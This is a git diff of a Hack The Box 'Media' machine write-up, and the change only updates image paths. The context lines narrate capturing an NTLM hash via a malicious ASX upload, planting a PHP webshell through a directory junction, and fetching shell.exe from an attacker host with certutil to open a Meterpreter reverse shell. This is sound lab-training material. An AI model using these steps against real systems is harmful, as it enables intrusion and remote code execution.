@@ -83,7 +83,7 @@ These findings indicated a Windows machine running a web server, confirming the 
 
 I navigated to the HTTP service running on port 80 and discovered a recruitment form requesting personal information and a video introduction. The form explicitly stated: "Upload a brief introduction video (compatible with Windows Media Player)". 
 
-![](1.png)
+![](HTB-machines/Medium/Windows/Media/1.png)
 
 This presented a file upload functionality that accepted Windows Media Player formats, including ASX, WMV, AVI, and other multimedia formats, creating a potential exploitation vector.
 
@@ -121,9 +121,9 @@ $ sudo responder -I tun0
 
 I then submitted the recruitment form with arbitrary values and uploaded the malicious ASX file, and received the following promtp:
 
-![](2.png)
+![](HTB-machines/Medium/Windows/Media/2.png)
 
-![](3.png)
+![](HTB-machines/Medium/Windows/Media/3.png)
 
 Within seconds of the upload, Responder captured a NetNTLMv2 hash from the account `MEDIA\enox`:
 
@@ -425,7 +425,7 @@ enox@MEDIA C:\Users\enox>dir /q C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6
 
 The junction successfully exposed the Apache web root directory structure. Now, any file uploaded through the web form would be written by the PHP script to `C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6984982925\`, which the operating system would transparently redirect to `C:\xampp\htdocs\`. This meant uploaded files would be immediately accessible via HTTP and executable in the context of `NT AUTHORITY\LOCAL SERVICE`. With this junction in place, I submitted the recruitment form with predictable parameters and uploaded a PHP webshell, knowing it would be placed directly in the web root and accessible without requiring knowledge of the directory path structure
 
-![](4.png)
+![](HTB-machines/Medium/Windows/Media/4.png)
 
 After uploading the PHP webshell through the recruitment form, I verified its presence in both the uploads directory and the web root to confirm the junction was functioning correctly:
 
@@ -443,7 +443,7 @@ enox@MEDIA C:\Users\enox>dir /q C:\xampp\htdocs
 
 The directory listing of `C:\xampp\htdocs` confirmed that `shell.php` was present and owned by `NT AUTHORITY\LOCAL SERVICE`. I then accessed the webshell through the HTTP interface by navigating to `http://10.129.234.67/shell.php` in a web browser. This activated the PHP webshell and executed it in the security context of `NT AUTHORITY\LOCAL SERVICE`, the account under which the Apache web server was running. The webshell provided a direct interface for executing arbitrary system commands with the privileges of the service account.
 
-![](5.png)
+![](HTB-machines/Medium/Windows/Media/5.png)
 
 ### ***Phase 5: Establishment of Interactive Reverse Shell***
 
@@ -471,7 +471,7 @@ From the PHP webshell, I used Windows' built-in file transfer utility to downloa
 certutil.exe -urlcache -split -f http://10.10.14.102:9000/shell.exe C:\xampp\htdocs\shell.exe
 ```
 
-![](6.png)
+![](HTB-machines/Medium/Windows/Media/6.png)
 
 A Metasploit handler was configured to receive the reverse connection:
 
@@ -486,7 +486,7 @@ msf exploit(multi/handler) > run
 
 The payload was executed from the webshell, resulting in a successful Meterpreter session:
 
-![](7.png)
+![](HTB-machines/Medium/Windows/Media/7.png)
 
 ```
 [*] Sending stage (248902 bytes) to 10.129.234.67
